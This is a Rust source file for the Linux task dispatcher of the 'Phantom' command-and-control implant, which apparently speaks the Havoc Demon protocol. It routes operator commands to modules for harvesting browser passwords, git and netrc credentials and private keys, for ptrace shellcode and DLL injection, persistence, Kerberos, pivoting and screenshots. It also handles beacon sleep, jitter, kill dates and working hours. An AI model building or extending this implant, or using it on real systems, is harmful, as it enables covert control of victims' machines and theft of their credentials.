//! Linux task execution for the Phantom agent.

mod encode;
mod filesystem;
mod harvest;
mod inject;
mod kerberos;
mod network;
mod persist;
mod pivot;
mod process;
mod screenshot;
mod state;
mod sysinfo;
mod types;

// Public API: items used by `agent.rs` and other crate modules.
pub(crate) use types::{DownloadTransferState, PendingCallback, PhantomState};

// Items brought into scope for the inline `#[cfg(test)] mod tests`, which
// accesses them via `super::`.  Scoped to test builds so the bindings do not
// leak into production code.
#[cfg(test)]
use self::types::{
    ActiveDownload, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_WRITECOPY, PivotConnection,
};
#[cfg(test)]
use encode::{encode_bytes, encode_harvest_entries};
#[cfg(test)]
use filesystem::CAT_SIZE_LIMIT;
#[cfg(test)]
use harvest::{
    HarvestEntry, collect_browser_passwords, collect_git_credential_cache_from, collect_netrc,
    is_private_key_bytes,
};
#[cfg(test)]
use inject::{
    INJECT_ERROR_FAILED, INJECT_WAY_EXECUTE, INJECT_WAY_INJECT, check_ptrace_permission,
    find_libc_base, read_from_proc_mem, resolve_dlopen_in_target, wait_for_sigtrap,
    write_to_proc_mem,
};
#[cfg(test)]
use persist::remove_shell_rc_block;
#[cfg(test)]
use process::parse_memory_region;
#[cfg(test)]
use screenshot::capture_x11_native;
#[cfg(test)]
use sysinfo::{
    parse_group_entries, parse_logged_on_sessions, parse_logged_on_users, parse_user_entries,
};
#[cfg(test)]
use types::{GroupEntry, SessionEntry, UserEntry};

use crate::config::PhantomConfig;
use crate::error::PhantomError;
use crate::parser::TaskParser;
use red_cell_common::demon::{DemonCommand, DemonConfigKey, DemonPackage};
use std::path::{Path, PathBuf};

use self::encode::{encode_u32, encode_u64};

/// Execute a single Demon task package.
pub(crate) async fn execute(
    package: &DemonPackage,
    config: &mut PhantomConfig,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => {}
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let delay_ms = match u32::try_from(parser.int32()?) {
                Ok(v) => v,
                Err(_) => {
                    tracing::warn!("CommandSleep: negative delay clamped to 0");
                    0
                }
            };
            let jitter = u32::try_from(parser.int32()?).unwrap_or(0).min(100);
            config.sleep_delay_ms = delay_ms;
            config.sleep_jitter = jitter;
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: format!("sleep updated to {delay_ms} ms"),
            });
        }
        DemonCommand::CommandFs => {
            filesystem::execute_filesystem(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandProcList => {
            let payload = process::execute_process_list(&package.payload)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProcList),
                request_id: package.request_id,
                payload,
            });
        }
        DemonCommand::CommandProc => {
            process::execute_process(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandNet => {
            network::execute_network(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandSocket => {
            network::execute_socket(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandMemFile => {
            network::execute_memfile(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandTransfer => {
            network::execute_transfer(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandKillDate => {
            let mut parser = TaskParser::new(&package.payload);
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };
            let label = if kill_date > 0 {
                format!("kill date set to {kill_date}")
            } else {
                String::from("kill date disabled")
            };
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: label,
            });
        }
        DemonCommand::CommandConfig => {
            execute_config(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandPivot => {
            pivot::execute_pivot(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandScreenshot => {
            screenshot::execute_screenshot(package.request_id, state).await?;
        }
        DemonCommand::CommandInjectShellcode => {
            inject::execute_inject_shellcode(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandInjectDll => {
            inject::execute_inject_dll(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandSpawnDll => {
            inject::execute_spawn_dll(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            state.queue_callback(PendingCallback::Exit {
                request_id: package.request_id,
                exit_method,
            });
        }
        DemonCommand::CommandPackageDropped => {
            execute_package_dropped(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandPersist => {
            persist::execute_persist(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandHarvest => {
            harvest::execute_harvest(package.request_id, state).await?;
        }
        DemonCommand::CommandKerberos => {
            kerberos::execute_kerberos(package.request_id, &package.payload, state)?;
        }
        // Windows-only commands: return explicit not-supported errors.
        command @ (DemonCommand::CommandToken
        | DemonCommand::CommandInlineExecute
        | DemonCommand::CommandJob
        | DemonCommand::CommandPsImport
        | DemonCommand::CommandAssemblyInlineExecute
        | DemonCommand::CommandAssemblyListVersions
        | DemonCommand::CommandProcPpidSpoof) => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("command {command:?} is not supported on Linux"),
            });
        }
        command => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("phantom does not implement command {command:?} yet"),
            });
        }
    }

    Ok(())
}

/// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
/// dropped (e.g. exceeded the SMB pipe buffer limit).
///
/// The payload carries two u32 values:
/// - `dropped_package_length` — size of the dropped package in bytes.
/// - `max_length` — the maximum allowed buffer size.
///
/// Any in-flight download whose `request_id` matches the dropped package is
/// marked for removal so the agent does not keep trying to send chunks for a
/// transfer the teamserver will never complete.
fn execute_package_dropped(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let dropped_length = parser.int32()? as u32;
    let max_length = parser.int32()? as u32;

    tracing::warn!(
        request_id,
        dropped_length,
        max_length,
        "package dropped — cleaning up in-flight state"
    );

    // Mark any active download associated with this request as removed so
    // `push_download_chunks` will close it on the next poll cycle.
    for download in &mut state.downloads {
        if download.request_id == request_id {
            download.state = DownloadTransferState::Remove;
        }
    }

    state.queue_callback(PendingCallback::Error {
        request_id,
        text: format!("package dropped: size {dropped_length} exceeds max {max_length}"),
    });

    Ok(())
}

/// Handle `CommandConfig` (ID 2500): reconfigure live agent parameters.
///
/// The payload starts with a config key (u32) followed by key-specific data.
/// For Linux-relevant keys the value is applied and echoed back as a
/// [`PendingCallback::Structured`] response.  Windows-only keys are rejected
/// with an error callback.
fn execute_config(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let raw_key = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative config key"))?;

    let key = match DemonConfigKey::try_from(raw_key) {
        Ok(key) => key,
        Err(_) => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("unknown config key {raw_key}"),
            });
            return Ok(());
        }
    };

    match key {
        DemonConfigKey::KillDate => {
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u64(u64::try_from(kill_date).unwrap_or_default()));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        DemonConfigKey::WorkingHours => {
            let hours = parser.int32()?;
            let hours_u32 = u32::try_from(hours)
                .map_err(|_| PhantomError::TaskParse("negative working hours value"))?;
            state.working_hours = if hours_u32 != 0 {
                Some(
                    i32::try_from(hours_u32)
                        .map_err(|_| PhantomError::TaskParse("working hours overflow"))?,
                )
            } else {
                None
            };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u32(hours_u32));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        // Windows-only configuration keys — not applicable to Linux.
        DemonConfigKey::ImplantSpfThreadStart
        | DemonConfigKey::ImplantVerbose
        | DemonConfigKey::ImplantSleepTechnique
        | DemonConfigKey::ImplantCoffeeThreaded
        | DemonConfigKey::ImplantCoffeeVeh
        | DemonConfigKey::MemoryAlloc
        | DemonConfigKey::MemoryExecute
        | DemonConfigKey::InjectTechnique
        | DemonConfigKey::InjectSpoofAddr
        | DemonConfigKey::InjectSpawn64
        | DemonConfigKey::InjectSpawn32 => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("config key {key:?} is not supported on Linux"),
            });
        }
    }

    Ok(())
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

pub(crate) fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

#[cfg(test)]
mod tests;
